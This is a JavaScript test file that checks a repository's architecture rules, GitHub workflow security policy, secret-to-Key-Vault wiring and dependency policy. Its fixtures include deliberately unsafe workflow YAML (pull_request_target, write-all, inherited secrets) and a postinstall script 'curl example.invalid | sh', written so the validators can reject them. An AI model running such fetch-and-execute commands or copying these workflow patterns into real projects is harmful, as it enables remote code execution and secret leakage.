import assert from 'node:assert/strict';
import { readFileSync } from 'node:fs';
import { mkdtemp, rm, writeFile } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import test from 'node:test';
import {
  architectureFindings,
  bundledMcpFindings,
  importsFrom,
  sourceArchitectureFindings,
} from '../check-architecture.mjs';
import { inspectDependencyFiles, packageChangeRequiresLockfile } from '../check-lockfile-policy.mjs';
import { workflowPolicyFindings } from '../lib/workflow-policy.mjs';
import { validateAgentSkills } from '../validate-agent-skills.mjs';

test('repository architecture dependency directions are valid', () => {
  assert.deepEqual(architectureFindings(), []);
});

test('architecture import parser recognizes static and dynamic imports', () => {
  assert.deepEqual(importsFrom("import value from './one.js'; await import('../two.js');"), ['./one.js', '../two.js']);
});

test('application architecture rejects transport and Azure runtime SDK imports', () => {
  const root = '/tmp/architecture-fixture';
  const file = `${root}/application/operation.ts`;
  const findings = sourceArchitectureFindings(
    file,
    "import type { HttpRequest } from '@azure/functions'; import { tool } from '../mcp/tool.js';",
    root,
  );
  assert.ok(findings.some((finding) => finding.includes('runtime SDK @azure/functions')));
  assert.ok(findings.some((finding) => finding.includes('application must not import mcp')));
});

test('authorization architecture rejects provider and transport dependencies', () => {
  const root = '/tmp/architecture-fixture';
  const file = `${root}/application/authorization/policy.ts`;
  const findings = sourceArchitectureFindings(file, "import { client } from '../../shared/bring/client.js';", root);
  assert.ok(findings.some((finding) => finding.includes('authorization policy must remain')));
});

test('MCP stays bundled behind one server and one Function route', () => {
  assert.deepEqual(bundledMcpFindings(), []);
});

test('workflow security policy passes the protected workflow set', async () => {
  assert.deepEqual(await workflowPolicyFindings(), []);
});

test('workflow policy rejects unpinned actions, inherited secrets, dynamic secrets, and alternate credentials', async (context) => {
  const directory = await mkdtemp(join(tmpdir(), 'workflow-permissions-'));
  context.after(() => rm(directory, { recursive: true, force: true }));
  await writeFile(
    join(directory, 'unsafe.yml'),
    `on: pull_request_target\npermissions: write-all\njobs:\n  unsafe:\n    runs-on: ubuntu-latest\n    permissions:\n      checks: write\n    steps:\n      - uses: actions/create-github-app-token@v2\n      - run: gh api repos/example/example/check-runs\n        env:\n          GH_TOKEN: \${{ secrets.REPOSITORY_PAT }}\n          AUTHORIZATION: \${{ secrets['GH_APP_PRIVATE_KEY'] }}\n  reusable:\n    uses: ./.github/workflows/reusable.yml\n    secrets: inherit\n`,
  );

  const findings = await workflowPolicyFindings(directory);
  assert.ok(findings.some((finding) => finding.includes('pull_request_target is forbidden')));
  assert.ok(findings.some((finding) => finding.includes('write-all permissions are forbidden')));
  assert.ok(findings.some((finding) => finding.includes('token minting actions are forbidden')));
  assert.ok(findings.some((finding) => finding.includes('external actions must be pinned')));
  assert.ok(findings.some((finding) => finding.includes('GitHub authentication must use the built-in job token')));
  assert.ok(findings.some((finding) => finding.includes('workflow secret REPOSITORY_PAT is not approved')));
  assert.ok(findings.some((finding) => finding.includes('dynamic or bracket workflow secret access is forbidden')));
  assert.ok(findings.some((finding) => finding.includes('must not inherit all secrets')));
  assert.ok(findings.some((finding) => finding.includes('raw check-run API access is forbidden')));
  assert.ok(findings.some((finding) => finding.includes('raw check-run writers are forbidden')));
});

test('pull-request jobs cannot execute candidate commands with write permissions', async (context) => {
  const directory = await mkdtemp(join(tmpdir(), 'workflow-untrusted-write-'));
  context.after(() => rm(directory, { recursive: true, force: true }));
  await writeFile(
    join(directory, 'unsafe.yml'),
    `on: pull_request\npermissions:\n  contents: read\njobs:\n  unsafe:\n    runs-on: ubuntu-latest\n    permissions:\n      contents: read\n      security-events: write\n    steps:\n      - run: npm test\n`,
  );
  assert.ok(
    (await workflowPolicyFindings(directory)).some((finding) =>
      finding.includes('untrusted pull-request code must not run with write credentials'),
    ),
  );
});

test('runtime REC model analysis remains deterministic-first and cost bounded', () => {
  const analyzer = readFileSync(
    new URL('../../apps/api/src/shared/errors/llmDiagnosticAnalyzer.ts', import.meta.url),
    'utf8',
  );
  const service = readFileSync(
    new URL('../../apps/api/src/shared/errors/repairableErrorService.ts', import.meta.url),
    'utf8',
  );
  assert.match(service, /deterministic\.classification !== 'diagnostic_uncertain'/);
  assert.match(analyzer, /const DEFAULT_MODEL = 'gpt-5\.6-luna'/);
  assert.match(analyzer, /const MAX_INPUT_BYTES = 24_000/);
  assert.match(analyzer, /const MAX_OUTPUT_TOKENS = 700/);
  assert.match(analyzer, /reasoning: \{ effort: 'high' \}/);
  assert.match(analyzer, /verbosity: 'low'/);
  assert.match(analyzer, /maxRetries: 0/);
  assert.match(analyzer, /configured === DEFAULT_MODEL \? configured : null/);
  assert.match(analyzer, /try \{\s+const capsuleJson = JSON\.stringify\(args\.capsule\)/);
  assert.doesNotMatch(analyzer, /gpt-5\.6-sol/);
});

test('Azure Functions loads the fail-closed composition root before registering functions', () => {
  const apiPackage = JSON.parse(readFileSync(new URL('../../apps/api/package.json', import.meta.url), 'utf8'));
  const compositionRoot = readFileSync(new URL('../../apps/api/src/index.ts', import.meta.url), 'utf8');
  const infrastructure = readFileSync(new URL('../../infra/main.bicep', import.meta.url), 'utf8');
  const functionAppSettingsModule = readFileSync(
    new URL('../../infra/modules/function-app-settings.bicep', import.meta.url),
    'utf8',
  );
  assert.equal(apiPackage.main, 'dist/index.js');
  assert.ok(
    compositionRoot.indexOf('assertRuntimeSafety();') < compositionRoot.indexOf("import('./functions/health.js')"),
  );
  assert.match(infrastructure, /module functionAppSettings '\.\/modules\/function-app-settings\.bicep' = \{/);
  assert.doesNotMatch(infrastructure, /resource functionAppSettings 'Microsoft\.Web\/sites\/config/);
  assert.match(infrastructure, /list\('\$\{functionApp\.id\}\/config\/appsettings'/);
  assert.match(infrastructure, /appSettings: union\(preservedFunctionReleaseSettings, \{/);
  assert.match(functionAppSettingsModule, /@secure\(\)\s+@description[\s\S]*?param appSettings object/);
  assert.match(functionAppSettingsModule, /resource appSettingsResource 'Microsoft\.Web\/sites\/config@[^']+' = \{/);
  assert.match(functionAppSettingsModule, /properties: appSettings/);
  for (const setting of [
    ['AUTH_ENABLED', 'authEnabled'],
    ['AUTH_DEBUG', 'authDebug'],
    ['WEATHER_ENABLED', 'weatherEnabled'],
    ['BRING_ENABLED', 'bringEnabled'],
    ['BRING_ADD_ENABLED', 'validatedBringAddEnabled'],
    ['BRING_DESTRUCTIVE_ENABLED', 'validatedBringDestructiveEnabled'],
    ['BRING_SESSION_CACHE_ENABLED', 'bringSessionCacheEnabled'],
    ['REPAIRABLE_ERRORS_LLM_ENABLED', 'repairableErrorsLlmEnabled'],
  ]) {
    assert.match(infrastructure, new RegExp(`${setting[0]}: toLower\\(string\\(${setting[1]}\\)\\)`));
  }
  assert.doesNotMatch(
    infrastructure,
    /(?:AUTH_ENABLED|AUTH_DEBUG|BRING_ENABLED|BRING_ADD_ENABLED|BRING_DESTRUCTIVE_ENABLED|BRING_SESSION_CACHE_ENABLED|REPAIRABLE_ERRORS_LLM_ENABLED): string\(/,
  );
  for (const setting of [
    'WEBSITE_RUN_FROM_PACKAGE',
    'DEPLOYED_COMMIT_SHA',
    'DEPLOYED_SOURCE_REF',
    'DELIVERY_CORRELATION',
    'DELIVERY_MUTATION_RUN_ID',
    'DELIVERY_MUTATION_CORRELATION',
    'DELIVERY_MUTATION_CONTROLLER_SHA',
    'DELIVERY_MUTATION_KIND',
    'RELEASE_FUNCTION_SHA256',
    'RELEASE_FRONTEND_SHA256',
    'RELEASE_SBOM_SHA256',
  ]) {
    assert.match(infrastructure, new RegExp(`contains\\(existingFunctionAppSettings, '${setting}'\\)`));
  }
  assert.doesNotMatch(infrastructure, /siteConfig:\s*\{[\s\S]*?appSettings:\s*\[/);
});

test('weather secret follows the environment-isolated GitHub to Key Vault reference chain', () => {
  const delivery = readFileSync(new URL('../../.github/workflows/delivery-v2.yml', import.meta.url), 'utf8');
  const deployment = readFileSync(new URL('../../.github/workflows/deploy-environment.yml', import.meta.url), 'utf8');
  const infrastructure = readFileSync(new URL('../../infra/main.bicep', import.meta.url), 'utf8');
  assert.match(delivery, /GOOGLE_WEATHER_API_KEY: \$\{\{ secrets\.GOOGLE_WEATHER_API_KEY \}\}/);
  assert.match(deployment, /GOOGLE_WEATHER_API_KEY:\s*\n\s*description:[\s\S]*?required: false/);
  assert.match(deployment, /GOOGLE_WEATHER_API_KEY: \$\{\{ secrets\.GOOGLE_WEATHER_API_KEY \}\}/);
  assert.match(deployment, /EXPECTED_GOOGLE_WEATHER_API_KEY_REFERENCE="\$expected_google_weather_reference"/);
  assert.match(
    infrastructure,
    /@secure\(\)\s*@description\('Google Weather API key;[\s\S]*?param googleWeatherApiKey string/,
  );
  assert.match(infrastructure, /name: 'google-weather-api-key'/);
  assert.match(
    infrastructure,
    /GOOGLE_WEATHER_API_KEY: weatherEnabled \? '@Microsoft\.KeyVault\(SecretUri=\$\{googleWeatherApiKeySecret!\.properties\.secretUriWithVersion\}\)' : ''/,
  );
  assert.doesNotMatch(deployment, /GOOGLE_WEATHER_API_KEY[^\n]*GITHUB_OUTPUT|echo[^\n]*GOOGLE_WEATHER_API_KEY/);
});

test('YouTube secret and feature flag remain consistent through deployment verification', () => {
  const delivery = readFileSync(new URL('../../.github/workflows/delivery-v2.yml', import.meta.url), 'utf8');
  const deployment = readFileSync(new URL('../../.github/workflows/deploy-environment.yml', import.meta.url), 'utf8');
  const infrastructure = readFileSync(new URL('../../infra/main.bicep', import.meta.url), 'utf8');
  assert.match(delivery, /SUPADATA_API_KEY: \$\{\{ secrets\.SUPADATA_API_KEY \}\}/);
  assert.match(deployment, /YOUTUBE_TRANSCRIPT_ENABLED: \$\{\{ vars\.YOUTUBE_TRANSCRIPT_ENABLED \|\| 'false' \}\}/);
  assert.match(deployment, /EXPECTED_SUPADATA_API_KEY_REFERENCE="\$expected_supadata_reference"/);
  assert.match(infrastructure, /@secure\(\)[\s\S]*?param supadataApiKey string/);
  assert.match(infrastructure, /name: 'supadata-api-key'/);
  assert.match(
    infrastructure,
    /SUPADATA_API_KEY: youtubeTranscriptEnabled \? '@Microsoft\.KeyVault\(SecretUri=\$\{supadataSecret!\.properties\.secretUriWithVersion\}\)' : ''/,
  );
  assert.doesNotMatch(deployment, /SUPADATA_API_KEY[^\n]*GITHUB_OUTPUT|echo[^\n]*SUPADATA_API_KEY/);
  assert.equal((deployment.match(/oidcRequiredScopes=/g) ?? []).length, 1);
  assert.match(
    deployment,
    /oidcRequiredScopes="\$\{OIDC_REQUIRED_SCOPES:-catalogue\.read,reddit\.read,youtube\.read,wlh\.read,weather\.read,bring\.read,bring\.write,bring\.complete,bring\.remove\}"/,
  );
});

test('staged deployment Bicep preserves its required output contract', () => {
  const infrastructure = readFileSync(new URL('../../infra/main.bicep', import.meta.url), 'utf8');
  for (const output of [
    'functionAppResourceName',
    'hostStorageAccountResourceName',
    'releaseStorageAccountResourceName',
    'staticWebStorageAccountResourceName',
    'privateStorageAccountResourceName',
    'applicationInsightsResourceName',
    'keyVaultResourceName',
    'monthlyBudgetEur',
  ]) {
    assert.match(infrastructure, new RegExp(`^output ${output} `, 'm'));
  }
});

test('repository agent skills have valid frontmatter and unique names', () => {
  assert.deepEqual(validateAgentSkills(), []);
});

test('dependency policy rejects lifecycle scripts and non-registry dependencies', () => {
  const findings = inspectDependencyFiles(
    {
      scripts: { postinstall: 'curl example.invalid | sh' },
      dependencies: { unsafe: 'git+https://example.invalid/repo.git' },
    },
    { lockfileVersion: 2, packages: {} },
  );
  assert.ok(findings.some((finding) => finding.includes('postinstall')));
  assert.ok(findings.some((finding) => finding.includes('non-registry')));
  assert.ok(findings.some((finding) => finding.includes('lockfileVersion 3')));
});

test('dependency lock co-change exception is limited to package scripts', () => {
  const base = {
    name: 'example',
    version: '1.0.0',
    scripts: { test: 'node --test' },
    dependencies: { yaml: '^2.9.0' },
    engines: { node: '>=22' },
  };
  assert.equal(
    packageChangeRequiresLockfile(base, {
      ...base,
      scripts: { ...base.scripts, 'agent:learning:validate': 'node validate.mjs' },
    }),
    false,
  );
  assert.equal(
    packageChangeRequiresLockfile(base, {
      ...base,
      dependencies: { yaml: '^2.10.0' },
    }),
    true,
  );
  assert.equal(packageChangeRequiresLockfile(base, { ...base, engines: { node: '>=24' } }), true);
  assert.equal(packageChangeRequiresLockfile(base, { ...base, packageManager: 'npm@11.0.0' }), true);
});
